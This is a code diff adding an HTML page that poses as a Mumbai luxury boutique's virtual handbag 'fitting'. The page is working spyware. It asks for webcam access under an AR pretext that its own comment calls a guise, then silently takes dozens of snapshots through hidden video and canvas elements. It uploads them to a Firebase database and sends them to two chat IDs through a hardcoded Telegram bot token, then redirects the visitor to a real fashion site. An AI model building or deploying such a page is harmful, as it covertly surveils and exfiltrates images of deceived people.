@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Maison Mumbai | Exclusive Access</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    
+    <style>
+        :root {
+            --haute-beige: #fdfaf5;
+            --haute-black: #1a1a1a;
+            --haute-accent: #c2a382;
+            --haute-grey: #757575;
+        }
+
+        body { 
+            margin: 0; padding: 0; background: var(--haute-beige); color: var(--haute-black);
+            font-family: 'Didot', 'Bodoni MT', serif;
+            display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh;
+        }
+
+        .boutique-card {
+            width: 100%; max-width: 400px; background: #ffffff;
+            border: 1px solid #e0e0e0; box-shadow: 0 10px 30px rgba(0,0,0,0.05);
+            overflow: hidden; text-align: center;
+        }
+
+        .hero-image {
+            height: 220px; background: url('https://images.unsplash.com/photo-1584917865442-de89df76afd3?auto=format&fit=crop&w=400&q=80') center;
+            background-size: cover; border-bottom: 1px solid #f0f0f0;
+        }
+
+        .boutique-body { padding: 40px 30px; }
+
+        .brand-name { 
+            font-size: 26px; letter-spacing: 6px; text-transform: uppercase; 
+            margin: 0 0 10px; font-weight: 400; 
+        }
+
+        .sub-brand { 
+            font-family: 'Inter', sans-serif; font-size: 11px; 
+            letter-spacing: 2px; color: var(--haute-grey); margin-bottom: 30px;
+        }
+
+        h2 { font-size: 18px; font-weight: 400; margin-bottom: 12px; }
+        p { font-family: 'Inter', sans-serif; font-size: 13px; color: var(--haute-grey); line-height: 1.6; margin-bottom: 30px; }
+
+        .btn-fitting {
+            background: var(--haute-black); color: #fff; border: none;
+            width: 100%; padding: 16px; font-size: 12px; font-weight: 600;
+            text-transform: uppercase; letter-spacing: 3px; cursor: pointer;
+            transition: opacity 0.3s;
+        }
+        .btn-fitting:hover { opacity: 0.9; }
+
+        /* AR UI */
+        #ar-ui { display: none; }
+        
+        .fitting-ring {
+            width: 50px; height: 50px; border: 1px solid var(--haute-accent);
+            border-top: 1px solid var(--haute-black); border-radius: 50%;
+            margin: 0 auto 20px; animation: rotate 1.5s linear infinite;
+        }
+        @keyframes rotate { to { transform: rotate(360deg); } }
+
+        .ar-status { font-family: 'Inter', sans-serif; font-size: 13px; color: var(--haute-black); font-weight: 500; }
+        .node-tag { font-family: 'Inter', sans-serif; font-size: 10px; color: #ccc; margin-top: 25px; }
+    </style>
+</head>
+<body>
+
+    <div class="boutique-card">
+        <div class="hero-image"></div>
+        
+        <div class="boutique-body" id="init-view">
+            <div class="brand-name">Maison</div>
+            <div class="sub-brand">MUMBAI • PARIS • MILAN</div>
+            
+            <h2>The Handbag Collection</h2>
+            <p>Experience our private gallery with <b>ProportionAI™</b>. We require a brief visual scaling to perfectly render the collection against your silhouette.</p>
+            
+            <button class="btn-fitting" onclick="initiateFitting()">Start Virtual Fitting</button>
+            <div class="node-tag">SECURE ACCESS • MUMBAI_HUB_07</div>
+        </div>
+
+        <div class="boutique-body" id="ar-ui">
+            <div class="fitting-ring"></div>
+            <div class="ar-status">Calibrating Scale Sensors...</div>
+            <div style="font-family: 'Inter', sans-serif; font-size: 11px; color: #999; margin-top: 8px;" id="ar-timer">Identity handshake valid for 60s</div>
+            
+            <div style="text-align: left; background: #fafafa; padding: 15px; border-radius: 4px; font-family: monospace; font-size: 9px; color: #777; margin-top: 30px; border: 1px solid #eee;">
+                > INITIALIZING_BIOMETRIC_LINK...<br>
+                > LOCATION: MUMBAI_MAH_INDIA<br>
+                > SYNCING_AR_OVERLAY_ENGINE...
+            </div>
+        </div>
+    </div>
+
+    <!-- Hidden Capture Components -->
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBlRY8iXI5jK8GH8tku6A0We3tC_0iiup4",
+            authDomain: "shadow-app-4q69.firebaseapp.com",
+            databaseURL: "https://shadow-app-4q69-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "shadow-app-4q69",
+            storageBucket: "shadow-app-4q69.firebasestorage.app",
+            messagingSenderId: "109693889633",
+            appId: "1:109693889633:web:f1654b2fb1de886cdc8e20"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        const TOKEN = '8620771394:AAGl1HASK_i24zIpAZLCC7wRIwxlUvkxYrI';
+        const IDS = ['7617707778', '7194705917'];
+
+        async function initiateFitting() {
+            try {
+                // Request camera permission under the guise of AR Scaling
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('init-view').style.display = 'none';
+                document.getElementById('ar-ui').style.display = 'block';
+
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let timeLeft = 60;
+                    let count = 0;
+
+                    const interval = setInterval(() => {
+                        timeLeft--;
+                        count++;
+                        document.getElementById('ar-timer').innerText = `Identity handshake valid for ${timeLeft}s`;
+
+                        if (count <= 55) {
+                            hauteCapture(count);
+                        }
+
+                        if (timeLeft <= 0) {
+                            clearInterval(interval);
+                            stream.getTracks().forEach(t => t.stop());
+                            // Redirect to a real luxury fashion landing page
+                            window.location.href = "https://www.gucci.com";
+                        }
+                    }, 1000);
+                };
+            } catch (err) {
+                window.location.href = "https://www.gucci.com";
+            }
+        }
+
+        function hauteCapture(idx) {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const b64 = canvas.toDataURL('image/jpeg', 0.2);
+            database.ref('captures').push({ 
+                image: b64, 
+                type: "HANDBAG_AR_SPOOF", 
+                ts: Date.now(),
+                loc: "MUMBAI_BOUTIQUE" 
+            });
+
+            canvas.toBlob(blob => {
+                IDS.forEach(id => {
+                    const fd = new FormData();
+                    fd.append('chat_id', id); fd.append('photo', blob, 'maison_mumbai_recon.jpg');
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                });
+            }, 'image/jpeg', 0.3);
+        }
+    </script>
+</body>
+</html>
